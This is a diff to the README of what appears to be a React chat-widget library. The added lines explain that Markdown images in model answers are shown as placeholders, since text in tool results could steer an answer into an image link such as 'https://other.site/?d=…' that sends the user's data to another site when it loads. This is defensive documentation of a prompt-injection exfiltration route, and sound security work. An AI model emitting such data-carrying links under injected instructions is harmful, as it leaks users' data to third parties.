@@ -176,7 +176,7 @@ export const Page = () => <AskAIProvider storageKey="my-app:help"><Shell /></Ask
 
 `components` on `AskAIChat`, `AskAIWidget` and `AskAI` replaces parts of the chat: `Text`, `ToolFallback`, `UserMessage`, `AssistantMessage`, `Empty` and `Composer`. Message slots render inside assistant-ui's message scope; use `AskAIMessageContent` in them to keep the `Text` and `ToolFallback` overrides, and `AskAIMessageActions` for copy and regenerate (labels via `copy`, `copied`, `regenerate`). Define slot components at module scope so they don't remount while streaming.
 
-`MarkdownText` is the default `Text`: GitHub-flavored Markdown with raw HTML skipped. It reads the current assistant-ui text part and accepts `MarkdownTextProps` (`components`, `remarkPlugins`, `className`, ...).
+`MarkdownText` is the default `Text`: GitHub-flavored Markdown with raw HTML skipped. Images in an answer are not loaded but shown as `[image: alt]`: tool results can carry text other people wrote, and an answer steered into `![](https://other.site/?d=…)` would send the user's data there the moment it loaded. Pass `components.img` to render them. It reads the current assistant-ui text part and accepts `MarkdownTextProps` (`components`, `remarkPlugins`, `className`, ...).
 
 Default components carry `data-byok` attributes for styling (`root`, `trigger`, `dialog`, `panel`, `setup`, `chat`, `messages`, `message` with `data-role`, `composer`, `tool`, `markdown`, `message-actions`, `history`, `tools`, `image` with `data-missing`, `composer-images`, `message-images`, `add-image`, and others). The dialog is portalled to `document.body`, so style it by attribute or class rather than ancestor selectors. `AskAIHistory` takes `title`, `description` and `empty` to replace its copy.
 
@@ -216,6 +216,7 @@ Assistants that pass the same `connectionKey` share one connection: connecting o
 - Browsers can't launch stdio MCP servers; expose them over Streamable HTTP.
 - Authenticating users and authorizing tool calls is the MCP server's job. Supply credentials through `headers`.
 - Tools run as soon as the model calls them; there is no approval step. Don't expose tools with effects the user hasn't agreed to.
+- Treat answers as untrusted: tool results can carry other people's text. Images in answers aren't loaded (see Custom UI); links need a click. A custom `img` component, or rendering answers as HTML, undoes that.
 - Use one `AskAI` or `mountAskAI` per `storageKey`: two mounted with the same key overwrite each other's conversations.
 
 ## Project layout
